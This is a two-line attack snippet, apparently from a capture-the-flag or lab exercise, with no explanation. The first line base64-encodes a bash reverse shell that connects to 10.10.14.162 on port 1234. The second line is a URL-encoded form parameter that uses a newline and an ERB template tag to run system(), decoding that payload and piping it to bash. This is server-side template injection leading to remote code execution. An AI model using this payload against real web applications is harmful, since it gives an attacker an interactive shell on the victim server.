```
base64 <<< "bash -i >& /dev/tcp/10.10.14.162/1234 0>&1" | sed 's/\+/\%2b/'

category1=History%0A<%25%3dsystem("echo+$b64+|+base64+-d+|+bash");%25>
```